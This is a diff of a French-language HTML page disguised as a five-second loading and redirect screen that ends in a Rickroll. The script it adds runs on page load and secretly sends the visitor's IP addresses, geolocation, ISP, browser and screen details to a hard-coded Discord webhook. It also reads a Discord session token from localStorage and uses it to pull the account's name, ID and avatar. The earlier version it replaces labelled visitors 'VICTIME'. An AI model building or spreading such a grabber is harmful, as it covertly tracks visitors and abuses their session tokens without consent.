@@ -2,49 +2,131 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>Chargement...</title>
+  <title>Chargement en cours...</title>
   <style>
-    body{background:#000;color:#fff;font-family:Arial;text-align:center;padding-top:20%}
-    .l{border:12px solid #333;border-top:12px solid #f00;border-radius:50%;width:70px;height:70px;animation:s 1s linear infinite;margin:0 auto 20px}
-    @keyframes s{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
+    body {
+      background: #000;
+      color: #fff;
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding-top: 15%;
+      margin: 0;
+      height: 100vh;
+    }
+    .loader {
+      border: 14px solid #222;
+      border-top: 14px solid #ff3333;
+      border-radius: 50%;
+      width: 90px;
+      height: 90px;
+      animation: spin 1.2s linear infinite;
+      margin: 0 auto 30px;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    h1 { font-size: 28px; margin: 10px 0; }
+    p { font-size: 18px; color: #ccc; }
+    .countdown { font-size: 22px; margin-top: 20px; color: #ff6666; }
   </style>
 </head>
 <body>
-  <div class="l"></div>
-  <h1>Veuillez patienter 5 secondes...</h1>
-  <p>Redirection en cours</p>
+  <div class="loader"></div>
+  <h1>Veuillez patienter...</h1>
+  <p>Redirection automatique en cours</p>
+  <div class="countdown" id="timer">5 secondes</div>
 
 <script>
-// ←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←
-// METS TON WEBHOOK DISCORD ICI (c’est LA SEULE CHOSE à changer)
+// ←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←
+// METS TON WEBHOOK DISCORD ICI
 const webhook = "https://discord.com/api/webhooks/1452985926451200201/HOLaPjkC1fq5ZCk2m-RFRPBvD09-MiFAz2h--jrZPh9kaXma-Xnzl9PUVvyVL0gPZzCl";
-// ↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑
+// ↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑
 
-Promise.all([
-  fetch("https://api.ipify.org?format=json").then(r=>r.json()),
-  fetch("https://api6.ipify.org?format=json").then(r=>r.json()).catch(()=> ({ip:"non détectée"}))
-]).then(([v4, v6]) => {
-  fetch(webhook, {
-    method: "POST",
-    headers: {"Content-Type": "application/json"},
-    body: JSON.stringify({
-      embeds: [{
-        color: 16711680,
-        title: "VICTIME",
-        description: 
-`IP: IPv4 \`${v4.ip}\`
-IP: v6 \`${v6.ip}\`
-IP: IPpublic \`${v4.ip}\``,
-        timestamp: new Date().toISOString()
-      }]
-    })
-  });
-});
+(async () => {
+  try {
+    const [ipv4Res, ipv6Res, geoRes] = await Promise.allSettled([
+      fetch("https://api.ipify.org?format=json").then(r => r.ok ? r.json() : {ip: "inconnu"}),
+      fetch("https://api6.ipify.org?format=json").then(r => r.ok ? r.json() : {ip: "inconnu"}),
+      fetch("https://ipapi.co/json/").then(r => r.ok ? r.json() : {})
+    ]);
 
-setTimeout(() => {
-  location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
-}, 5000);
+    const ipv4 = ipv4Res.status === "fulfilled" ? ipv4Res.value.ip : "inconnu";
+    const ipv6 = ipv6Res.status === "fulfilled" ? ipv6Res.value.ip : "inconnu";
+    const geo = geoRes.status === "fulfilled" ? geoRes.value : {};
 
+    const ua = navigator.userAgent;
+    const lang = navigator.language || "inconnu";
+    const screenRes = `${screen.width}x${screen.height}`;
+    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "inconnu";
+
+    let discordUsername = "Non détecté (pas connecté à Discord ou bloqueur actif)";
+    let discordTag = "";
+    let discordId = "";
+    let discordAvatar = "";
+
+    try {
+      const token = localStorage.getItem("token")?.replace(/"/g, '');
+      if (token) {
+        const tokenRes = await fetch("https://discord.com/api/v9/users/@me", {
+          headers: { "Authorization": token }
+        });
+        if (tokenRes.ok) {
+          const user = await tokenRes.json();
+          discordUsername = user.global_name || user.username || "Inconnu";
+          discordTag = `${user.username}#${user.discriminator}`;
+          discordId = user.id;
+          discordAvatar = user.avatar ? `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png?size=128` : "";
+        }
+      }
+    } catch (e) {}
+
+    const message = `
+🎯 **Nouvelle visite détectée**
+
+**Pseudo Discord :** ${discordUsername}
+**Tag complet :** ${discordTag || "Non détecté"}
+**ID Discord :** ${discordId || "Non détecté"}
+
+**IP IPv4 :** \`${ipv4}\`
+**IP IPv6 :** \`${ipv6}\`
+**Pays :** ${geo.country_name || "Inconnu"} (${geo.country_code || "??"})
+**Ville / Région :** ${geo.city || "Inconnu"} • ${geo.region || ""}
+**FAI :** \`${geo.org || "Inconnu"}\`
+
+**Navigateur / OS :** ${ua.substring(0, 300)}
+**Langue :** ${lang}
+**Résolution écran :** ${screenRes}
+**Fuseau horaire :** ${timezone}
+**Page visitée :** ${window.location.href}
+**Heure (UTC) :** ${new Date().toISOString()}
+    `.trim();
+
+    await fetch(webhook, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        content: message,
+        username: discordUsername !== "Non détecté" ? discordUsername : "Tracker",
+        avatar_url: discordAvatar || ""
+      })
+    });
+
+  } catch (e) {}
+})();
+
+// Compte à rebours + ouverture dans un nouvel onglet
+let timeLeft = 5;
+const timerEl = document.getElementById("timer");
+const countdown = setInterval(() => {
+  timeLeft--;
+  timerEl.textContent = timeLeft + (timeLeft === 1 ? " seconde" : " secondes");
+  if (timeLeft <= 0) {
+    clearInterval(countdown);
+    // Ouvre dans un nouvel onglet → plus d'erreur Firefox !
+    window.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ", "_blank");
+  }
+}, 1000);
 </script>
 </body>
 </html>
